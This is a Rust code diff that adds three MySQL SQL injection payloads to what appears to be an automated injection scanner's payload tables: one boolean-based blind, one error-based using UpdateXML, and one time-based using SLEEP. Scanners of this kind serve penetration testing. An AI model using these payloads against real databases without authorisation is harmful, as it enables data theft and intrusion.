@@ -83,6 +83,16 @@ pub fn boolean_payloads() -> Vec<Payload> {
                 false_q: "AND (SELECT [RANDNUM] FROM (SELECT([RANDNUM]))[RANDSTR])=[RANDNUM1]",
             },
         },
+        Payload {
+            title: "Generic boolean-based blind - AND (MySQL comment)",
+            dbms: None,
+            level: 2,
+            risk: 1,
+            check: Check::Boolean {
+                true_q: "AND [RANDNUM]=[RANDNUM]#",
+                false_q: "AND [RANDNUM]=[RANDNUM1]#",
+            },
+        },
     ]
 }
 
@@ -97,6 +107,15 @@ pub fn error_payloads() -> Vec<Payload> {
             risk: 1,
             check: Check::Error {
                 q: "AND ExtractValue(1,CONCAT(0x7e,[RANDSTR]))",
+            },
+        },
+        Payload {
+            title: "MySQL >= 5.1.5 AND error-based - UpdateXML",
+            dbms: Some("mysql"),
+            level: 1,
+            risk: 1,
+            check: Check::Error {
+                q: "AND UpdateXML(1,CONCAT(0x7e,[RANDSTR]),1)",
             },
         },
         Payload {
@@ -148,6 +167,15 @@ pub fn time_payloads() -> Vec<Payload> {
             risk: 1,
             check: Check::Time {
                 q: "AND SLEEP([SLEEPTIME])",
+            },
+        },
+        Payload {
+            title: "MySQL >= 5.0.12 AND time-based blind - SLEEP (subquery)",
+            dbms: Some("mysql"),
+            level: 2,
+            risk: 1,
+            check: Check::Time {
+                q: "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])",
             },
         },
         Payload {
